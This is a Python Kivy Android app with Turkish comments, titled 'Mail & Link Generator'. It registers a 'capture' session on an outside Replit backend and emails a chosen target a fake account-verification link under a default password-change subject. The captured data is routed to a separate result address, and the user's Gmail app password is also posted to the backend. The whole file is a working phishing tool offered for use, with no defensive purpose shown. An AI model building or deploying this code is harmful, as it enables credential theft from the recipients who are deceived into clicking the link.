"""
Mail & Link Generator - Kivy Android App
=========================================
Gereksinimler:
  pip install kivy kivymd

Buildozer ile APK almak için:
  1. buildozer init
  2. buildozer.spec içinde requirements = python3,kivy,kivymd,smtplib,requests,email
  3. buildozer android debug

Notlar:
  - Gmail için "Uygulama Şifresi" (App Password) kullanın.
    Google Hesabı > Güvenlik > 2 Adımlı Doğrulama > Uygulama Şifreleri
  - Capture URL'i, deploy ettikten sonra aşağıdaki BASE_URL değişkenini
    kendi Replit domain'inizle güncelleyin.
"""

import smtplib
import ssl
import uuid
import requests
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.core.window import Window
from kivy.metrics import dp

# =============================================================
# Buraya deploy ettikten sonra kendi Replit domain'inizi yazın
# Örnek: https://mail-link-generator.kullaniciadi.replit.app
# =============================================================
BASE_URL = "https://mail-link-generator--azechat060.replit.app"
# =============================================================

Window.clearcolor = (0.95, 0.95, 0.97, 1)


def create_field(label_text, password=False, multiline=False, hint=""):
    layout = BoxLayout(orientation="vertical", size_hint_y=None, height=dp(80) if not multiline else dp(120), spacing=dp(4))
    label = Label(
        text=label_text,
        size_hint_y=None,
        height=dp(24),
        halign="left",
        valign="middle",
        color=(0.2, 0.2, 0.3, 1),
        font_size=dp(13),
    )
    label.bind(size=label.setter("text_size"))
    inp = TextInput(
        password=password,
        multiline=multiline,
        hint_text=hint,
        size_hint_y=None,
        height=dp(44) if not multiline else dp(80),
        padding=[dp(10), dp(10)],
        background_color=(1, 1, 1, 1),
        foreground_color=(0.1, 0.1, 0.2, 1),
        cursor_color=(0.2, 0.4, 0.8, 1),
        font_size=dp(14),
    )
    layout.add_widget(label)
    layout.add_widget(inp)
    return layout, inp


class MailLinkApp(App):
    def build(self):
        root = ScrollView(do_scroll_x=False)

        main = BoxLayout(
            orientation="vertical",
            padding=dp(20),
            spacing=dp(12),
            size_hint_y=None,
        )
        main.bind(minimum_height=main.setter("height"))

        # Başlık
        title = Label(
            text="Mail & Link Generator",
            font_size=dp(22),
            bold=True,
            color=(0.1, 0.2, 0.5, 1),
            size_hint_y=None,
            height=dp(48),
            halign="center",
        )
        title.bind(size=title.setter("text_size"))
        main.add_widget(title)

        subtitle = Label(
            text="Alanları doldurun ve linki gönderin",
            font_size=dp(13),
            color=(0.5, 0.5, 0.6, 1),
            size_hint_y=None,
            height=dp(24),
            halign="center",
        )
        subtitle.bind(size=subtitle.setter("text_size"))
        main.add_widget(subtitle)

        # Ayırıcı
        main.add_widget(BoxLayout(size_hint_y=None, height=dp(8)))

        # === ALANLAR ===
        row_msg, self.inp_message = create_field(
            "1. Mesaj İçeriği",
            multiline=True,
            hint="E-posta gövdesine yazılacak metin...",
        )
        main.add_widget(row_msg)

        row_sender, self.inp_sender = create_field(
            "2. Gönderici E-posta",
            hint="ornek@gmail.com",
        )
        main.add_widget(row_sender)

        row_pass, self.inp_pass = create_field(
            "3. E-posta Uygulama Şifresi",
            password=True,
            hint="Gmail uygulama şifresi (16 karakter)",
        )
        main.add_widget(row_pass)

        row_recv, self.inp_receiver = create_field(
            "4. Alıcı E-posta",
            hint="alici@example.com",
        )
        main.add_widget(row_recv)

        row_result, self.inp_result = create_field(
            "5. Sonuç E-postası (yakalanan veri burayı gider)",
            hint="sonuc@example.com",
        )
        main.add_widget(row_result)

        # Konu (opsiyonel)
        row_subject, self.inp_subject = create_field(
            "Konu (opsiyonel)",
            hint="Şifre Değişikliği Bildirimi",
        )
        main.add_widget(row_subject)

        # Gönder Butonu
        main.add_widget(BoxLayout(size_hint_y=None, height=dp(8)))
        btn = Button(
            text="OLUŞTUR VE GÖNDER",
            size_hint_y=None,
            height=dp(50),
            background_color=(0.2, 0.4, 0.85, 1),
            color=(1, 1, 1, 1),
            bold=True,
            font_size=dp(15),
        )
        btn.bind(on_press=self.on_send)
        main.add_widget(btn)

        # Üretilen Link Alanı
        row_link, self.inp_link = create_field(
            "Üretilen Link (e-postanın altına eklendi)",
            hint="Link burada görünecek...",
        )
        self.inp_link.readonly = True
        self.inp_link.background_color = (0.93, 0.95, 0.99, 1)
        main.add_widget(row_link)

        root.add_widget(main)
        return root

    def show_popup(self, title, message):
        content = BoxLayout(orientation="vertical", padding=dp(10), spacing=dp(10))
        content.add_widget(Label(text=message, halign="center"))
        btn = Button(text="Tamam", size_hint_y=None, height=dp(40))
        popup = Popup(title=title, content=content, size_hint=(0.85, 0.4))
        btn.bind(on_press=popup.dismiss)
        content.add_widget(btn)
        popup.open()

    def on_send(self, instance):
        message = self.inp_message.text.strip()
        sender = self.inp_sender.text.strip()
        password = self.inp_pass.text.strip()
        receiver = self.inp_receiver.text.strip()
        result_email = self.inp_result.text.strip()
        subject = self.inp_subject.text.strip() or "Şifre Değişikliği Bildirimi"

        if not all([message, sender, password, receiver, result_email]):
            self.show_popup("Hata", "Lütfen tüm alanları doldurun.")
            return

        if BASE_URL == "https://BURAYA_DOMAIN_YAZIN":
            self.show_popup("Uyarı", "BASE_URL güncellenmedi. main.py içinde kendi domain'inizi yazın.")
            return

        def run():
            try:
                # 1. Capture oturumu oluştur (backend'e kaydet)
                resp = requests.post(
                    f"{BASE_URL}/api/sessions",
                    json={
                        "senderEmail": sender,
                        "senderPassword": password,
                        "resultEmail": result_email,
                        "messageSubject": subject,
                    },
                    timeout=10,
                )

                if resp.status_code != 201:
                    self.show_popup("Hata", f"Oturum oluşturulamadı: {resp.text}")
                    return

                data = resp.json()
                capture_url = data["captureUrl"]

                # 2. E-postayı gönder
                full_message = (
                    f"{message}\n\n"
                    f"---\n"
                    f"Hesabınızı doğrulamak için aşağıdaki bağlantıya tıklayın:\n"
                    f"{capture_url}"
                )

                msg = MIMEMultipart("alternative")
                msg["Subject"] = subject
                msg["From"] = sender
                msg["To"] = receiver

                html_body = f"""
                <html><body>
                  <p>{message.replace(chr(10), '<br>')}</p>
                  <hr>
                  <p>Hesabınızı doğrulamak için <a href="{capture_url}">buraya tıklayın</a>.</p>
                  <p style="color:#888;font-size:12px;">Bu bağlantı bir kez kullanılabilir.</p>
                </body></html>
                """
                msg.attach(MIMEText(full_message, "plain"))
                msg.attach(MIMEText(html_body, "html"))

                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    server.login(sender, password)
                    server.sendmail(sender, receiver, msg.as_string())

                # 3. UI güncelle
                self.inp_link.text = capture_url
                self.show_popup("Başarılı", f"E-posta gönderildi!\n\nLink:\n{capture_url}")

            except requests.exceptions.ConnectionError:
                self.show_popup("Bağlantı Hatası", f"Sunucuya ulaşılamadı.\nURL: {BASE_URL}")
            except smtplib.SMTPAuthenticationError:
                self.show_popup("Gmail Hatası", "E-posta giriş hatası. Uygulama şifresini kontrol edin.")
            except Exception as e:
                self.show_popup("Hata", str(e))

        threading.Thread(target=run, daemon=True).start()


if __name__ == "__main__":
    MailLinkApp().run()
